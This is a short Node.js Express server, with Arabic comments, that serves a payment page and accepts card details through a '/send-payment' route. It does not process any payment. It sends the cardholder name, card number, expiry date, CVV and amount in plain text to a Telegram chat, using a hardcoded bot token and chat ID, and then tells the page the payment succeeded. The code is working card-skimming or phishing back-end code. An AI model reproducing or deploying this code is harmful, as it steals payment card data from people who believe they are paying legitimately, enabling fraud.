const express = require('express');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');

const app = express();
app.use(bodyParser.json());
app.use(express.static('public'));

// بيانات بوت التليجرام الخاص بك
const BOT_TOKEN = '8428698833:AAHTDJu1uFDF61ytjsxh8PlSWwbrSPWSGG0'; 
const CHAT_ID = '8302667206'; 

// استقبال بيانات البطاقة وإرسالها للتليجرام
app.post('/send-payment', async (req, res) => {
    const { cardName, cardNumber, expiry, cvv, amount } = req.body;

    const message = `
🔔 **عملية دفع جديدة** 🔔
💰 المبلغ: ${amount}
👤 الاسم: ${cardName}
💳 الرقم: ${cardNumber}
📅 التاريخ: ${expiry}
🔒 CVV: ${cvv}
    `;

    try {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: 'فشل الإرسال' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
